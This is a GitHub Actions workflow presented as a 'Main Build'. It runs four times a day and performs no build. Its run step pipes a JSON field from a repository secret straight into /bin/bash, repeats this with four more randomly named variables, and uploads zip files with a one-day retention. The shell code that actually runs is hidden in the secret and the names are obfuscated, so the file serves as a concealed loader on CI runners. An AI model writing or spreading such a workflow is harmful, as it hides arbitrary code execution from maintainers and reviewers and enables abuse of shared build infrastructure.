name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '28 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  execute:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          ma6667: ${{ secrets.ma6667 }}
        run: |
          printf '%s' "$ma6667" | jq -r .np408 | /bin/bash
          echo $i3 | jq -r .mc42 | /bin/bash
          printf '%s' "$yz62353" | jq -r .cfq48 | /bin/bash
          echo $dkco04425 | jq -r .vvuqh867 | /bin/bash
          printf '%s' "$au16708" | jq -r .d675 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: 7WmNMkGo
          path: "*.zip"
          retention-days: 1
